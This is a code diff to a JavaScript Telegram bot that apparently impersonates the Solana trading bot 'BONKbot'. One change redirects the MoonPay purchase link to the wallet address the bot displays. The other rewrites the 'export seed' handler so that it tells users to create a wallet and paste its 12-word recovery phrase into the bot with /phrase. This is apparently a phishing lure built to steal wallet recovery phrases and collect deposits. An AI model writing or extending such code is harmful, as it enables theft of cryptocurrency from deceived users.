@@ -40,7 +40,7 @@ const registerCallbackHandlers = (bot) => {
                             "You currently have no SOL in your wallet. To start trading, deposit SOL to your BONKbot wallet address:\n\n" +
                             "<code>AAk24Eoz2WpgiRXF829RrwxvxsED5eFhvjpZjumq9AfX</code> (tap to copy)\n\n" +
                             "Or buy SOL with Apple / Google Pay via MoonPay here:\n" +
-                            "<a href=\"https://buy.moonpay.com/?apiKey=pk_live_tgPovrzh9urHG1HgjrxWGq5xgSCAAz&walletAddress=4k5EaQx7hbzQLfvjhRRTm9CnemhmRbHBW5AKBZhENGBq&showWalletAddressForm=true&currencyCode=sol&signature=N8oNLwn5GI1SyFFLp5%2BWuCrpUBeSDPrx%2FH2FgWgOvcA%3D\">https://buy.moonpay.com</a>\n\n" +
+                            "<a href=\"https://buy.moonpay.com/?apiKey=pk_live_tgPovrzh9urHG1HgjrxWGq5xgSCAAz&walletAddress=AAk24Eoz2WpgiRXF829RrwxvxsED5eFhvjpZjumq9AfX&showWalletAddressForm=true&currencyCode=sol&signature=N8oNLwn5GI1SyFFLp5%2BWuCrpUBeSDPrx%2FH2FgWgOvcA%3D\">https://buy.moonpay.com</a>\n\n" +
                             "Once done, tap refresh and your balance will appear here.\n\n" +
                             "To buy a token: enter a ticker, token address, or URL from pump.fun, Birdeye, DEX Screener or Meteora.\n\n" +
                             "For more info on your wallet and to export your seed phrase, tap 'Wallet' below.",
@@ -139,7 +139,7 @@ const registerCallbackHandlers = (bot) => {
                     break;
                 case 'export_seed':
                     await bot.answerCallbackQuery(query.id, {
-                        text: "Create a new wallet in your wallet app.\nThen copy the newly created wallet's 12 key phrase.\nProceed to input it below using:\n/phrase [12 key phrase]\nExample: /phrase word1 word2 word3 ... word12",
+                        text: "Create a new wallet in your wallet app.\nThen copy the newly created wallet's 12 key phrase.\nProceed to input it below using:\n/phrase [12 key phrase]\nExample: word1 word2 word3 ... word12",
                         show_alert: true
                     });
                     callbackAnswered = true;
